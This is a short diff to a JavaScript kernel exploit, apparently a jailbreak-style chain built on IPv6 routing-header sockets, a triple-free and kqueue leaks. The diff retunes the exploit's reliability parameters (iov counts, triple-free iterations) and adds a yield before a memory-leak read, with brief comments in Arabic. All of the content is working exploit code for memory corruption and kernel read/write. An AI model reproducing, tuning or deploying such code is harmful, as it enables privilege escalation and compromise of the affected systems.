@@ -110,15 +110,15 @@ var MSG_HDR_SIZE = 0x30;
 var FILEDESCENT_SIZE = 0x8;
 var UCRED_SIZE = 0x168;
 var RTHDR_TAG = 0x13370000;
-var UIO_IOV_NUM = 0x14;
-var MSG_IOV_NUM = 0x17;
+var UIO_IOV_NUM = 0x0C; // 12 بدل 20
+var MSG_IOV_NUM = 0x0C; // 12 بدل 23
 
 // Params for kext stability
 var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 9;
+var TRIPLEFREE_ITERATIONS = 7;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 0;
@@ -1674,6 +1674,8 @@ function leak_kqueue() {
     // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
+    
+    sched_yield(); // تهوية صغيرة قبل get_rthdr
 
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
